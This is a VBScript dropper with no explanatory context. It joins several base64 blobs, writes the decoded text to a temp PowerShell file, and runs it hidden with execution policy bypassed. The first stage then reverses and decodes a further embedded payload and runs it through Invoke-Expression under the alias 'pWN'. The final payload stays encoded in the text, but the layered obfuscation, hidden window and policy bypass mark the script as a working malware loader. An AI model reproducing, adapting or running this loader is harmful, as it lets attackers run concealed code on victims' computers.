odasuaudgagi = "JFIgPSAiPT1BZHVKSEk3MEhJN2tTYmxSM2M1TmxPNjAxY2xSWGRpbG1jMFJYUWx4V2FHNXlUSjVTYmxSM2M1TjFXZ0kzYmkxQ0l1Vkdaa2xHUzZvVFh6VkdkMUpXYXlSSGRCVkdicFprTFBsa0x0VkdkemwzVWJoQ0lsVkhiaFpWTGdNWFowVm5ZcEpIZDBGRUlsMVdZTzFDSXdSQ0lvUlhZUTFDSTVSbmNsQjNieUJWYmxSWFN0UVhaVEJ5T3AwV1owTlhlVHBqT2ROWFowVm5ZcEpIZDBGVVpzbG1SdThVU3UwV1owTlhlVHRGSXk5bVl0QWlibFJHWnBoa082MDFjbFJYZGlsbWMwUlhRbHhXYUc1eVRKNVNibFIzYzVOMVdvQVNaMXhXWVcxQ0l6VkdkMUpXYXlSSGRCQlNadEZtVHRBeWJrQUNhMEZHVXRBU2UwSlhadzltY1ExV1owbFVMMFYyVWdzVEtvVTJjdkIzY3BSa0wwNVdacHgyUWlWMmRrQXlPcDhHSmd3U2RrZ1Nac2xtUmtGMmJzNTJkdlJrTDA1V1pweDJRaVYyZGtBeU8wNVdacHgyUWlWMlZ1UVhaTzVTYmxSM2M1TkZJME5XWnFKMlR0Y1haT0JTUGdRbmJsbEdiREpXWjNSQ0k3SVNaNFZtTDZkaklnZ0dkaEJGWnNsR2FEMUNJd1JDSW9SWFlRMUNJb1JYWVExaWJwOW1TZzBESXZSQ0k3SVNaNFZtTHlwM052RTJMbkozYnVBWGE2MXlOdWMzZDM5eUw2TUhjMFJIYWlBU1BnVUhKZ3NUWmpKM2JHMUNJd1JDSW9SWFlRMUNJNUozYjBOV1p5bEdSZ1VHYzVSVmJsUlhTdEFTYmxSWFN0Y1haT0J5ZWdrU0tpVUdlbDVpZTN3RmNrSUNJb1JYWVExQ2R6VkdWb0FDZHY1V0xvQWlacEJ5T2lBWGFhNVdaMlYyY2NGR2RoUlViaEozWnZKSFVjcHpRaUFTUGdBSEpnc1RmZ1FYYWhkVkxnNFdaa1JXYUlCU1pzbEhkVGQzYms1V2FYMUNJbkpYWWtBQ2R6bEdUMDVXWnRWM1p5RlVMZ0FYYWFOSEpnZ0dkaEJWWnNsbVJ0QXljelYyWXZKSFV0UW5jaFIzVWdzakk1MUNJWEJuVGtBR2QzQVZjTVpqS0xkV0k1RVVKeUltSmVOalVvQlhMZ0lDWXc5R0ppQTJidEFpSWdoMll5RkdKaUFHSTRKQ0k5QXlaeUZHSmdzaklsaFhadW8zTmNCWGFhNVdaMlYyY2NGR2RoUlViaEozWnZKSFVjcHpRaUFTUGdBWGFhTkhKZ2tDY3ZSU1huNVdheVIzY2JCQ0xvTm1jaFJTWG41V2F5UjNjYmhDSXRGbWNoQkhJN0JDZDRWRUl1OVdhME5tYjFaR0k3MEhJOXRISW9OR2RoTkdJOUJDVmpWR1prQWlicDltYXRBaWJ5VkhkbEpISTlCeU9wZzJRd1JDSXRBaWNoaDJZa2dTWHlGR2FqdEZJOUFTWHBSeVdVTldaa1JDSTcwRmEwZG1ibHhrTHdNVFE0UkNJbEFTYWtzRk16RUVla0FTUGdnMlF3UkNJNzBWYWtzRlZqNVdaa0FTUGdJWFlvTkdKZ3NISXBzeUtwUkNJN2dHZG41V1pNNUNWajVXWmtBQ2RzMUNJcFJDSTdBREk5QVNha2dDSXk5bVpnc0RhMGRtYmx4a0xVTm1ibFJDSWR0bGNoaDJZZ1EzWWxwbVlQMXlkbDVFSTlBQ1ZqVkdaa0F5T3BJMFl1VkdKb2NtYnBKSGRUUlhaSDVDT0dSVlY2b1RYbjVXYWs5Mll1VmtMMGhYWlU1U2JsUjNjNU4xV2cwRElVTm1ibFJDSTdrQ05pUkhlMFJDS241V2F5UjNVMFlUWnpGbVF0OW1jR3BqT2RSbmNsWm5idk5rTHRWR2R6bDNVYkJTUGdJMFl1VkdKZ3NISTVKSGRna0NNekVFZWswMVp1bG1jME4zV2d3Q05pUkhlMFJTWG41V2F5UjNjYmhDSXRGbWNoQkhJN0J5WWxSRUl1OVdhME5tYjFaR0k3SVNmc1FDWVh0VFlpdG5mQTVHT05ORE9za2pZd0ZuSWcwRElqOW1jd1JDSTdJQ2Q2OVZNNTFXUDJnV0wwdDJRMFZsSWcwRElqOTJieUJISmdzVGZnMEhJN01HYjBKV2U2ZEdkdkZHYnRCeWVnZzJZMEYyWWcwSEk5QlNmZ3NEYTBCRmJtUkNJdFZHZEoxU1oyOVdibEpGSTdCU0tvUkhVc1pHSmdnR2RoQlZMME5YWlVoQ0ltbEdJOUJ5T3VWR1prbEdTZ1VHYjVSM1UzOUdadWwyVnRBQ1U0VkdKZ2dHZGhCVlpzbG1SdEF5Y3pWMll2SkhVdFFuY2hSM1Vnc0hJcEFGZWxSQ0lvUlhZUTFDZHpWR1ZvQWlacEJ5T2lVR2VsNWljbFJIYnBaRWFqSlhZbE5sSWdBRmQ0VkdKZ2dHZGhCVkx1bDJiS0JTUGdBRmVsUkNJN0FGZDRWR0pnQTNidEFDYTBCRmJtUkNJb05tY2gxQ0kwaFhSZ3NUS2lSQ0lzZ0dkUXhtWmtneWNsUlhlQ3hHYkJWR2RwSjNWNm9UWGx4V2FHNXlUSjVTYmxSM2M1TjFXZ3NUS2lvM051SUNJckFpYzBORlp1SkhKb0FDY3RSSEpnZ0dkaEJWTHVsMmJLQlNQZ2dHZFF4bVprQXllZ2tDTWdRM1p0QUNhMGRtYmx4a0xpUkNLZ1lXYWdzVEtWUkNLaFJYWUVSV1l2eG1iMzlHUnVNRUpnMERJaVJDSTdCU2V5UkhJN2tDTXhBQ0x3Z3ladWxtYzBOblkxTmxMcElpSWd3aUl1d2xJZ1UyWWh4R2NsSlhMZ2tDS2wxV1lPVkdicFpVYnZSbWJoSkZkbGRrTzYwRmEwRkdVdThVU3UwV1owTlhlVHRGS2cwREl5UjNVazVtY2tBeU9wRWpkazVtY2tnQ0l3MUdka0FDYTBGR1V0NFdhdnBFSTlBQ1UwaFhaa0F5T3BnQ2EwRkdVdzFXWlVSWFpIcGpPZGhHZGhCbExQbGtMdFZHZHpsM1ViQlNQZ0FYYjBSQ0k3a0NLbjVXYXlSM1V2UmxMcGdD" 
odasuauuudgagi = "eVIzY2lWM1V1a2lJaUFDTGk0Q1hpQVNaakZHYndWbWN0QVNLb1VXYmg1VVpzbG1SdDlHWnVGbVUwVjJSNm9UWG9SWFlRNXlUSjVTYmxSM2M1TjFXb0FTUGdJSGRUUm1ieVJDSTdrU00yUm1ieVJDS2dBWGIwUkNJb1JYWVExaWJwOW1TZzBESVFSSGVsUkNJN2tDS29SWFlRQlhibFJGZGxka082MEZhMEZHVXU4VVN1MFdaME5YZVR0Rkk5QUNjdFJISmdzVEtvY21icEpIZFQ5R1Z1a0NLa2xXZEhkWFpPcGpPZFJXYTFka0x0VkdkemwzVWJCU1BnRWpkazVtY2tBeU8wUkdKZzBESXpOV1prUkNJOUJ5T2o5bWN3UkNJd01UUTQxQ0l6NUdjekpISmdRalkwaEhkdEF5WWxSRUk5QUNka1JDSTdCU0t6NUdjekpISm9BaVpwQnlPbmhHWnpGR0pna21jVjFDSWs5R2EwVldUME5YWlMxU1pyOW1kdWxFSTlBeWN1QjNjeVJDSTdNMmJ2Skhja0FDTXpFRWV0QUNabWxIZGhaSEpnUWpZMGhIZHRBeVlsUkVJOUF5Wm9SMmNoUkNJN0lTU0xoRGRESm5jM3gyVDRNM1FFQjNkR3QwY3pSa2V3ZEhNTGhEYkRKWE4zTm1SMmNYWVBOSGNEeFVjM1IwVGo1R1I2VnpkRjkwWXdOa2UyYzNUUE5tY0RobE1zTmtaeUFIUjJWemR6c1VUeFIwTXlkbklnMERJa1pXZTBGbWRrQXllZ2tuYzBCeWVnUTNjd0JpYnZsR2RqNVdkbUJ5TzlCU2Znc0RkekJISTdCQ2FqUlhZakJTZmcwSEk5QnlPb1JIVXNaR0pnMFdaMGxVTGxaM2J0Vm1VZ3NISXBnR2RReG1aa0FDYTBGR1V0UTNjbFJGS2dZV2FnMEhJNzRXWmtSV2FJQlNac2xIZFRkM2JrNVdhWDFDSVFoWFprQUNhMEZHVWx4V2FHMUNJek5YWmo5bWNRMUNkeUZHZFRCeWVna0NVNFZHSmdnR2RoQlZMME5YWlVoQ0ltbEdJN0lTWjRWbUx5Vkdkc2xtUm9ObWNoVjJVaUFDVTBoWFprQUNhMEZHVXQ0V2F2cEVJOUFDVTRWR0pnc0RVMGhYWmtBQ2N2MUNJb1JIVXNaR0pnZzJZeUZXTGdRSGVGQnlPcGtuWWtBQ0xvUkhVc1pHSm9NWFowbG5Rc3hXUWxSWGF5ZGxPNjBWWnNsbVJ1OFVTdTBXWjBOWGVUdEZJN2tpSTZkakxpQXlLZ0lIZFRSbWJ5UkNLZ0FYYjBSQ0lvUlhZUTFpYnA5bVNnMERJb1JIVXNaR0pnc0hJcEFESTBkV0xnZ0dkbjVXWk01U2VpUkNLZ1lXYWdzVEt6Tldaa1JDS2hSWFlFUldZdnhtYjM5R1J1UW5ibGxHYmpSQ0k5QVNlaVJDSTdRbmJsbEdiREpXWlg1Q2RsNWtMdFZHZHpsM1VnUTNZbHBtWVAxeWRsNUVJOUFDZHVWV2FzTkdKZ3NUS3dFRElzQURLbjVXYXlSM2NpVjNVdWtpSWlBQ0xpNENYaUFTWmpGR2J3Vm1jdEFTS29VV2JoNVVac2xtUnQ5R1p1Rm1VMFYyUjZvVFhvUlhZUTV5VEo1U2JsUjNjNU4xV29BU1BnSUhkVFJtYnlSQ0k3a1NNMlJtYnlSQ0tnQVhiMFJDSW9SWFlRMWlicDltU2cwRElRUkhlbFJDSTdrQ0tvUlhZUUJYYmxSRmRsZGtPNjBGYTBGR1V1OFVTdTBXWjBOWGVUdEZJOUFDY3RSSEpnc1RLb2NtYnBKSGRUOUdWdWtDS2tsV2RIZFhaT3BqT2RSV2ExZGtMdFZHZHpsM1ViQlNQZ0VqZGs1bWNrQXlPMFJHSmcwREl6Tldaa1JDSTlCeU9qOW1jd1JDSXdNVFE0MUNJejVHY3pKSEpnUWpZMGhIZHRBeVlsUkVJOUFDZGtSQ0k3QlNLejVHY3pKSEpvQWlacEJ5T25aMmNrQVNheVZWTGdRMmJvUlhaTlIzY2xKVkxsdDJiMjVXU2cwREl6NUdjekpISmdzell2OW1jd1JDSXdNVFE0MUNJNnQyYWtBQ05pUkhlMDFDSWpWR1JnMERJbloyY2tBeU9pMFRQblYzUVlWemRJOUVPdk5FVDNjM1VQaGpiRHhrTjNKMVROSjNRekUzZGk5MGNxTmtZMmNYVVBOSGREQlZjM04wVDQ4R1J6VXpkT3QwY3VORVQyY25XUGhqY0RobE1zTmtaeUFIUjJWemR6c1VUeFIwTXlkbklnMERJNnQyYWtBeWVna25jMEJ5ZWdRbmJ5QmlidmxHZGo1V2RtQnlPOUJ5WWtBaWJ5VkhkbEpISTdBU0tvVTJjdngyUXVNWFp5UkNJN0FTS29VMmN2eDJRdUkzY2tBeU9na0NLazVXUnZSRlpoVm1VdUkzY2tBU1BnTUdKZ3NESXBrQ0t0RldaeVIzVWxObmJ2QjNjbEpGZGxka0x6Vm1ja2dpY2xSV1lsSlZiaFZtYzBObExQbGtMdFZHZHpsM1VnUTNZbHBtWVAxeWRsNUVJOUFpY3pSQ0k3QVNLb1UyY3U5R2N6Vm1VMFYyUnVJSEpnMERJelZtY2tBeU9nUUhKZzBESTBWM2JsMVdhVTVpY2tBeU9na1Nka2dTWjBGV1p5TmtPNjBGZHpWV2R4Vm1VaVYyVnVRWFpPNVNibFIzYzVOMVdnMERJeVJDSTdBU0t3QURNMUVESTlBQ2RrMEZkdWwyV2d3U2RrMDFadWxtYzBOM1dvQVNiaEpYWXdCeWVnTUZSZzQyYnBSM1l1Vm5aIjsgJHR4dCA9ICRSLlRvQ2hhckFycmF5KCk7IFthcnJheV06OlJldmVyc2UoJHR4dCk7ICRibmIgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC1qb2luICR0eHQpKTsgJGV4cCA9ICJJbnZva2UtRXhwcmVzc2lvbiI7IE5ldy1BbGlhcyAtTmFtZSBwV04gLVZhbHVlICRleHAgLUZvcmNlOyBwV04gJGJuYg==" 
odasuauudgagi = "WnBWM1IzVm1UNm9UWGtsV2RINVNibFIzYzVOMVdnMERJeFlIWnVKSEpna1NWazAxWnVsbWMwTjNXZ3d5UWswRmR1Vldhc05rWWxkbEwwVm1UdTBXWjBOWGVUdEZLZzBXWXlGR2Nnc0hJR2huUkVCaWJ2bEdkajVXZG1CeU85QlNmZ3NEZHpCSEk3QkNhalJYWWpCU2ZnMEhJOUJ5T29SSFVzWkdKZzBXWjBsVUxsWjNidFZtVWdzSElwZ0dkUXhtWmtBQ2EwRkdVdFEzY2xSRktnWVdhZzBISTc0V1prUldhSUJTWnNsSGRUZDNiazVXYVgxQ0lRaFhaa0FDYTBGR1VseFdhRzFDSXpOWFpqOW1jUTFDZHlGR2RUQnllZ2tDVTRWR0pnZ0dkaEJWTDBOWFpVaENJbWxHSTdJU1o0Vm1MeVZHZHNsbVJvTm1jaFYyVWlBQ1UwaFhaa0FDYTBGR1V0NFdhdnBFSTlBQ1U0VkdKZ3NEVTBoWFprQUNjdjFDSW9SSFVzWkdKZ2cyWXlGV0xnUUhlRkJ5T3BrbllrQUNMb1JIVXNaR0pvTVhaMGxuUXN4V1FsUlhheWRsTzYwVlpzbG1SdThVU3UwV1owTlhlVHRGSTdraUk2ZGpMaUF5S2dJSGRUUm1ieVJDS2dBWGIwUkNJb1JYWVExaWJwOW1TZzBESW9SSFVzWkdKZ3NISXBBREkwZFdMZ2dHZG41V1pNNVNlaVJDS2dZV2Fnc1RLek5XWmtSQ0toUlhZRVJXWXZ4bWIzOUdSdVFuYmxsR2JqUkNJOUFTZWlSQ0k3UW5ibGxHYkRKV1pYNUNkbDVrTHRWR2R6bDNVZ1EzWWxwbVlQMXlkbDVFSTlBQ2R1Vldhc05HSmdzVEt3RURJc0FES241V2F5UjNjaVYzVXVraUlpQUNMaTRDWGlBU1pqRkdid1ZtY3RBU0tvVVdiaDVVWnNsbVJ0OUdadUZtVTBWMlI2b1RYb1JYWVE1eVRKNVNibFIzYzVOMVdvQVNQZ0lIZFRSbWJ5UkNJN2tTTTJSbWJ5UkNLZ0FYYjBSQ0lvUlhZUTFpYnA5bVNnMERJUVJIZWxSQ0k3a0NLb1JYWVFCWGJsUkZkbGRrTzYwRmEwRkdVdThVU3UwV1owTlhlVHRGSTlBQ2N0UkhKZ3NUS29jbWJwSkhkVDlHVnVrQ0trbFdkSGRYWk9wak9kUldhMWRrTHRWR2R6bDNVYkJTUGdFamRrNW1ja0F5TzBSR0pnMERJek5XWmtSQ0k5QnlPajltY3dSQ0l3TVRRNDFDSXo1R2N6SkhKZ1FqWTBoSGR0QXlZbFJFSTlBQ2RrUkNJN0JTS3o1R2N6SkhKb0FpWnBCeU9uWjJja0FTYXlWVkxnUTJib1JYWk5SM2NsSlZMbHQyYjI1V1NnMERJejVHY3pKSEpnc3pZdjltY3dSQ0l3TVRRNDFDSXNWM2RvUkNJMElHZDRSWExnTVdaRUJTUGdjbVp6UkNJN0lTUDlFVWNESlhOM1oyVE5KV2JMMTBiRUJWYzNKMlRqOUdSaUozZHY5RU9uUkVWMmNuZFAxRWFFQkZjM2QzVE45R1JtRjNkcUpVTjNGMVN6QkhSM1V6ZDU1a04zUnpTejkyUVFkemRTOTBZd05rWjJjM1VQaGpjRGhsTXNOa1p5QUhSMlZ6ZHpzVVR4UjBNeWRuSWcwRElzVjNkb1JDSTdCU2V5UkhJN0J5WXNSblk1cDNaMDlXWXMxR0l1OVdhME5tYjFaR0k3MEhJOUJ5T3BnU1p6OUdjemxHUnVRbmJsbEdiREpXWjNSQ0k3QlNlc3hXWXVsbVpnMEhJN01HYjBKV2U2ZEdkdkZHYnRCeWVnZzJZMEYyWWcwSEk5QnlPeVpHSmdJMmRrQWlSNFpFUmdzell2Skhja0FTWHdzbGJzUkNJalZHUmcwREl5WkdKZ3NISXBBREkwZFdMZ2dHZG41V1pNNWlic1JDS2dZV2Fnc2pJdUJtSWdRWGFzQjNjdEFpWmpSR0pnMERJdXhHSmdzVEttZEdKb01GUmcwREltTkdaa0F5TzA1V1pweDJRaVYyVnVRWFpPNVNibFIzYzVORkkwTldacUoyVHRjWFpPQlNQZ0kyZGtBeU9qOTJieUJISmdBek1CaFhMZ1EyY2tBQ05pUkhlMDFDSWpWR1JnMERJbWRHSmdzakk5VVZOM2R6U2pGM1FJUnpkWTlVVDBSRVYxYzNVTGhqYkVoa04zTlhNeGRuU1BoamJEQlZjM1YxVE5CM1FNRjNkRTkwWXVSa2UxY1hSUE5HY0Rwbk4zOTBUakozUVlKRGJEWm1Nd1JrZDFjM01MMVVjRU5qYzNKQ0k5QUNaelJDSTdCU2V5UkhJN0J5Y25SSGNnNDJicFIzWXVWblpnc1RmZzBISTdNM1owQkhJN0JDYWpSWFlqQlNmZzBISTlCeU9vUkhVc1pHSmcwV1owbFVMbFozYnRWbVVnc0hJcGdHZFF4bVprQUNhMEZHVXRRM2NsUkZLZ1lXYWcwSEk3NFdaa1JXYUlCU1pzbEhkVGQzYms1V2FYMUNJUWhYWmtBQ2EwRkdVbHhXYUcxQ0l6TlhaajltY1ExQ2R5RkdkVEJ5ZWdrQ1U0VkdKZ2dHZGhCVkwwTlhaVWhDSW1sR0k3SVNaNFZtTHlWR2RzbG1Sb05tY2hWMlVpQUNVMGhYWmtBQ2EwRkdVdDRXYXZwRUk5QUNVNFZHSmdzRFUwaFhaa0FDY3YxQ0lvUkhVc1pHSmdnMll5RldMZ1FIZUZCeU9wa25Za0FDTG9SSFVzWkdKb01YWjBsblFzeFdRbFJYYXlkbE82MFZac2xtUnU4VVN1MFdaME5YZVR0Rkk3a2lJNmRqTGlBeUtnSUhkVFJtYnlSQ0tnQVhiMFJDSW9SWFlRMWlicDltU2cwRElvUkhVc1pHSmdzSElwQURJMGRXTGdnR2RuNVdaTTVTZWlSQ0tnWVdhZ3NUS3pOV1prUkNLaFJYWUVSV1l2eG1iMzlHUnVRbmJsbEdialJDSTlBU2VpUkNJN1FuYmxsR2JESldaWDVDZGw1a0x0VkdkemwzVWdRM1lscG1ZUDF5ZGw1RUk5QUNkdVZXYXNOR0pnc1RLd0VESXNBREtuNVdh" 
dajyugda78dauydajda = odasuaudgagi & odasuauudgagi & odasuauuudgagi 
Set base64Decoder = CreateObject("MSXml2.DOMDocument.6.0").createElement("base64") 
base64Decoder.DataType = "bin.base64" 
base64Decoder.Text = dajyugda78dauydajda 
decodedData = base64Decoder.NodeTypedValue 
outputFile = "5tempDir5\decode.ps1" 
Set fso = CreateObject("Scripting.FileSystemObject") 
Set outFile = fso.CreateTextFile(outputFile, True) 
outFile.Write BinaryToString(decodedData) 
outFile.Close 
Set shell = CreateObject("WScript.Shell") 
shell.Run "powershell.exe -ExecutionPolicy Bypass -File " & outputFile, 0, False 
Function BinaryToString(Binary) 
Dim RS, L 
Set RS = CreateObject("ADODB.Recordset") 
L = LenB(Binary) 
If L > 0 Then 
RS.Fields.Append "m", 201, L 
RS.Open 
RS.AddNew 
RS("m").AppendChunk Binary 
RS.Update 
BinaryToString = RS("m").GetChunk(L) 
Else 
BinaryToString = "" 
End If 
End Function 
